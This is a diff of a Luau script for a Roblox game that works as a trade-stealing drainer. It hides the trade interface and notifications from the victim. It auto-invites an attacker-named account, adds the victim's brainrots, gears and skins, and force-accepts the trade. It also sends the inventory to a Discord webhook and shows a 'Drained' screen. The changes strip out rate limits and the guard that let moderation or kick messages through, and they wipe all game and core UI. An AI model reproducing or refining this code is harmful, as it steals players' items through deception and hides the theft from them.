@@ -3,10 +3,6 @@
   Clean Luau rewrite of the decompiled bytecode.
   Args: targetUserId, targetUsername, webhookUrl, allowedAnimals, allowedBaseSkins, allowedGears
   [FIXED] Trade_%* format bug, HTTP timeouts, nil checks, infinite loop guards
-  [FIX #1] Ready/Accept min 2s cooldown per remote (anti-spam)
-  [FIX #2] Add loop: 0.2s delay between invokes
-  [FIX #3] Notif hook: whitelist kick-like text (real kick reason visible)
-  [FIX #4] Drained UI: selective clear (no global CoreGui wipe)
 ]]
 
 return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowedBaseSkins, allowedGears)
@@ -22,6 +18,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	local CREATOR_GROUP_ID = 35815907
 	local isInDuel = (game.PlaceId == 99606176102979)
 
+	-- Place / group gate
 	local function isAllowedPlace()
 		if game.PlaceId == MAIN_PLACE_ID then
 			return true
@@ -64,6 +61,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	end
 	getgenv().ChocolaRunning = true
 
+	-- Original controller methods (for hooks)
 	local originalToggle = InterfaceController.Toggle
 	local originalSetState = InterfaceController.SetState
 	local originalNotify = NotificationController.Notify
@@ -71,6 +69,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	local originalSuccess = NotificationController.Success
 	local originalPlaySound = SoundController.PlaySound
 
+	-- Resolve target user id from name if needed
 	if (not targetUserId or targetUserId == 0) and targetUsername and targetUsername ~= "" then
 		local ok, uid = pcall(function()
 			return Players:GetUserIdFromNameAsync(targetUsername)
@@ -86,7 +85,9 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return
 	end
 
-	local PRIORITY_WEBHOOK = ""
+	local PRIORITY_WEBHOOK =
+		""
+
 	local PRIORITY_BRAINROTS = {}
 
 	local AVATAR_URL =
@@ -95,6 +96,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	local webhookSent = false
 	local tradeActive = false
 
+	-- [FIX] Trade_%* invalid format specifier
 	local tradeChannel = ReplicatorClient.get("Trade_" .. tostring(LocalPlayer.UserId))
 	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
 
@@ -102,12 +104,14 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	allowedBaseSkins = allowedBaseSkins or {}
 	allowedGears = allowedGears or {}
 
+	-- Trade remotes resolved via getupvalue
 	local liveTrade, inviteRemote, addBrainrotRemote, addItemRemote
 	local readyRemote, acceptRemote, tradeEndRemote
 
 	task.spawn(function()
 		local getUpvalueFunc = debug.getupvalue or getupvalue
 		local t0 = tick()
+		-- [FIX] Add timeout to prevent infinite loop
 		while tick() - t0 < 15 do
 			pcall(function()
 				liveTrade = getUpvalueFunc(TradeController._createLiveTrade, 15)
@@ -138,7 +142,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	local INVITE_GUID = "9b5a0c7d-327f-415a-9720-b8e4f02b946a"
 	local READY_GUID = "1774f028-dbab-4713-8122-c30d77582edc"
 	local ACCEPT_GUID = "d061f53c-7d12-4a4a-a761-d70b06c0d44c"
-	local MISS_TARGET_ID = 10410494165
+	local MISS_TARGET_ID = 10410494165 -- secondary invite target for priority
 
 	local MUTATION_EMOJI = {
 		Bloodrot = "<:Bloodrot_Mutation_Icon:1526148047174766612>",
@@ -198,6 +202,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		Taco = "<:baseskintaco:1536944658809225286>",
 	}
 
+	-- Trait emoji map (abbreviated — full map from dump)
 	local TRAIT_EMOJI = {
 		["10B"] = "<:10b:1526146250590785579>",
 		["1 Year"] = "<:1YR_Icon_Fixed:1526146382757498970>",
@@ -259,6 +264,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		["Queen Bee"] = "<:queenbee:1543056608181882910>",
 	}
 
+	-- True if call stack includes TradeController
 	local function isFromTradeController()
 		for i = 2, 8 do
 			local src = debug.info(i, "s")
@@ -270,6 +276,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return false
 	end
 
+	-- Trade notification filter
 	local function isTradeNotifyText(msg)
 		if typeof(msg) ~= "string" then return false end
 		local plain = msg:gsub("<[^>]+>", "")
@@ -281,19 +288,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 			or (lower:find("other player") and lower:find("enough space"))
 	end
 
-	-- [FIX #3] Whitelist kick-like text so real reason is not suppressed
-	local function isKickLikeText(msg)
-		if typeof(msg) ~= "string" then return false end
-		local lower = msg:lower()
-		return lower:find("kick", 1, true)
-			or lower:find("banned", 1, true)
-			or lower:find("exploit", 1, true)
-			or lower:find("detected", 1, true)
-			or lower:find("suspicious", 1, true)
-			or lower:find("violation", 1, true)
-			or lower:find("moderation", 1, true)
-	end
-
+	-- Suppress trade SFX
 	SoundController.PlaySound = function(self, soundId, ...)
 		local tradeUI = InterfaceController:Get("TradeLiveTrade")
 		local fromTrade = isFromTradeController()
@@ -307,12 +302,14 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return originalPlaySound(self, soundId, ...)
 	end
 
+	-- Close trade UI if already open
 	if TradeLiveTrade and TradeLiveTrade:IsOpened() then
 		InterfaceController:Toggle("TradeLiveTrade", false)
 		CameraController:Blur(0, 0)
 		CameraController:Fov(CameraController:GetDefaultFov(), 0)
 	end
 
+	-- Block opening TradeLiveTrade
 	InterfaceController.Toggle = function(self, name, ...)
 		if name == "TradeLiveTrade" then return end
 		return originalToggle(self, name, ...)
@@ -323,27 +320,19 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	end
 
 	NotificationController.Notify = function(self, msg, ...)
-		if isKickLikeText(msg) then
-			return originalNotify(self, msg, ...)
-		end
 		if isFromTradeController() or isTradeNotifyText(msg) then return end
 		return originalNotify(self, msg, ...)
 	end
-	NotificationController.Error = function(self, msg, ...)
-		if isKickLikeText(msg) then
-			return originalError(self, msg, ...)
-		end
+	NotificationController.Error = function(self, ...)
 		if isFromTradeController() then return end
 		return originalError(self, ...)
 	end
-	NotificationController.Success = function(self, msg, ...)
-		if isKickLikeText(msg) then
-			return originalSuccess(self, msg, ...)
-		end
+	NotificationController.Success = function(self, ...)
 		if isFromTradeController() then return end
 		return originalSuccess(self, ...)
 	end
 
+	-- Format generation value
 	local function formatGen(value)
 		if not value or value == 0 then return "$0/s" end
 		local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
@@ -356,6 +345,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return "$" .. num .. (suffixes[tier + 1] or "") .. "/s"
 	end
 
+	-- Compute brainrot $/s with mutation + traits
 	local function computeGen(index, mutation, traits)
 		if type(index) ~= "string" then return 0 end
 		local animal = Animals[index]
@@ -379,6 +369,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return math.round(generation * mult)
 	end
 
+	-- Find local player profile cache via Synchronizer Channel
 	local function findPlayerCache()
 		for _, obj in getgc(true) do
 			if type(obj) == "table" and getmetatable(obj) == Channel then
@@ -389,6 +380,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end
 	end
 
+	-- [FIX] Add timeout to findPlayerCache loop
 	local profileCache
 	local cacheStart = tick()
 	repeat
@@ -408,6 +400,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		BaseSkins = {},
 	}
 
+	-- Continuous inventory scan
 	task.spawn(function()
 		while task.wait(0.1) do
 			local brainrots, skins, gears = {}, {}, {}
@@ -464,6 +457,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return false
 	end
 
+	-- [FIX] Add Timeout to fetchWikiThumb
 	local function fetchWikiThumb(name)
 		local url = "https://stealabrainrot.fandom.com/api.php?action=query&titles="
 			.. HttpService:UrlEncode(name)
@@ -484,6 +478,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		return nil
 	end
 
+	-- [FIX] Wrap HTTP in task.spawn to prevent blocking; embed content preserved
 	local function sendWebhooks()
 		if webhookSent then return end
 		webhookSent = true
@@ -506,6 +501,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 			end
 		end
 
+		-- Priority embed
 		if #priority > 0 then
 			task.spawn(function()
 				table.sort(priority, function(a, b) return a.genValue > b.genValue end)
@@ -563,6 +559,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 			end)
 		end
 
+		-- Main components webhook
 		if (#normal > 0 or #inventory.BaseSkins > 0 or #inventory.Gears > 0) and webhookUrl then
 			task.spawn(function()
 				local brainLines, skinLines, gearLines = {}, {}, {}
@@ -669,6 +666,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end
 	end
 
+	-- [FIX] Add nil check for tradeChannel:Observe
 	task.spawn(function()
 		if not tradeChannel or not tradeChannel.Observe then
 			warn("[Chocola] tradeChannel nil — skipping Observe")
@@ -681,6 +679,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end)
 	end)
 
+	-- [FIX] Add timeout to remotes wait
 	local waitStart = tick()
 	while not (liveTrade and inviteRemote and addBrainrotRemote and addItemRemote
 		and readyRemote and acceptRemote and tradeEndRemote) do
@@ -691,6 +690,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		task.wait()
 	end
 
+	-- Resolve display name
 	local displayTarget = targetUsername or ""
 	if (not displayTarget or displayTarget == "") and targetUserId and targetUserId ~= 0 then
 		pcall(function()
@@ -698,11 +698,13 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end)
 	end
 
+	-- Webhook once inventory is ready
 	task.spawn(function()
 		repeat task.wait(0.1) until hasAnyTargets()
 		sendWebhooks()
 	end)
 
+	-- Invite loop: priority secondary target, then main target
 	local function inviteLoopTick()
 		if tradeActive then return end
 		if hasPriorityBrainrots() then
@@ -719,38 +721,30 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 	end
 
 	task.spawn(function()
-		while task.wait(0.1) do
+		while task.wait(0.8) do
 			inviteLoopTick()
 		end
 	end)
 
-	-- [FIX #1] Ready/Accept: min 2s cooldown per remote (anti-spam)
+	-- Ready + Accept while in trade
 	task.spawn(function()
-		local lastReady, lastAccept = 0, 0
-		local READY_CD, ACCEPT_CD = 2, 2
-
-		local function fireReady()
-			local now = tick()
-			if now - lastReady < READY_CD then return end
-			lastReady = now
-			pcall(function() readyRemote:FireServer(READY_GUID) end)
-		end
-		local function fireAccept()
-			local now = tick()
-			if now - lastAccept < ACCEPT_CD then return end
-			lastAccept = now
-			pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
-		end
-
-		while task.wait(0.1) do
+		local readyFired, acceptFired = false, false
+		while task.wait(1) do
 			if not tradeActive then
-				lastReady, lastAccept = 0, 0
+				readyFired, acceptFired = false, false
 			else
-				fireReady()
-				task.wait(0.5)
-				fireAccept()
-				task.wait(0.5)
+				if not readyFired then
+					pcall(function() readyRemote:FireServer(READY_GUID) end)
+					readyFired = true
+				end
+				task.wait(2)
+				if not acceptFired then
+					pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
+					acceptFired = true
+				end
+				task.wait(1)
 
+				-- [FIX] Safe tradeChannel access
 				local players = nil
 				if tradeChannel and tradeChannel.TryIndex then
 					local ok, res = pcall(function()
@@ -772,10 +766,10 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 					end
 					if me then
 						if not me.ready then
-							fireReady()
+							pcall(function() readyRemote:FireServer(READY_GUID) end)
 						end
 						if not me.accepted then
-							fireAccept()
+							pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
 						end
 					end
 				end
@@ -783,7 +777,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end
 	end)
 
-	-- [FIX #2] Add loop with 0.2s delay between invokes
+	-- Add brainrots / gears / skins while in trade
 	task.spawn(function()
 		local bi, gi, si = 1, 1, 1
 		while true do
@@ -797,7 +791,6 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 					if ok and result == true then
 						bi = (bi % #inventory.Brainrots) + 1
 					end
-					task.wait(0.2)
 				end
 
 				local pickGear = math.random(1, 2) == 1
@@ -813,7 +806,6 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 						if ok and result == true then
 							gi = (gi % #inventory.Gears) + 1
 						end
-						task.wait(0.2)
 					end
 				elseif not pickGear and #inventory.BaseSkins > 0 then
 					local s = inventory.BaseSkins[si]
@@ -827,7 +819,6 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 						if ok and result == true then
 							si = (si % #inventory.BaseSkins) + 1
 						end
-						task.wait(0.2)
 					end
 				end
 
@@ -840,28 +831,14 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end
 	end)
 
-	-- [FIX #4] Drained UI: selective clear (no global CoreGui wipe)
+	-- "Drained" fullscreen UI
 	local function showDrainedUI()
 		pcall(function()
-			local pg = Players.LocalPlayer.PlayerGui
-			for _, child in ipairs(pg:GetChildren()) do
-				if child.Name == "TradeLiveTrade"
-					or child.Name == "BrainrotTrader"
-					or child.Name == "TradePrompts"
-				then
-					child:Destroy()
-				end
-			end
-			local cg = game:GetService("CoreGui")
-			for _, child in ipairs(cg:GetChildren()) do
-				if child.Name == "ChocolaDrainedUI" then
-					child:Destroy()
-				end
-			end
+			Players.LocalPlayer.PlayerGui:ClearAllChildren()
+			game:GetService("CoreGui"):ClearAllChildren()
 		end)
 
 		local gui = Instance.new("ScreenGui")
-		gui.Name = "ChocolaDrainedUI"
 		gui.IgnoreGuiInset = true
 		gui.ResetOnSpawn = false
 		gui.Parent = game:GetService("CoreGui")
@@ -1011,6 +988,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end)
 	end
 
+	-- When trade ends with target user → drained UI
 	if tradeEndRemote then
 		tradeEndRemote.OnClientEvent:Connect(function(payload)
 			if typeof(payload) == "table" and payload.otherUserId == targetUserId then
@@ -1019,6 +997,7 @@ return function(targetUserId, targetUsername, webhookUrl, allowedAnimals, allowe
 		end)
 	end
 
+	-- Force IsTrading attribute false
 	task.spawn(function()
 		LocalPlayer:SetAttribute("IsTrading", false)
 		LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
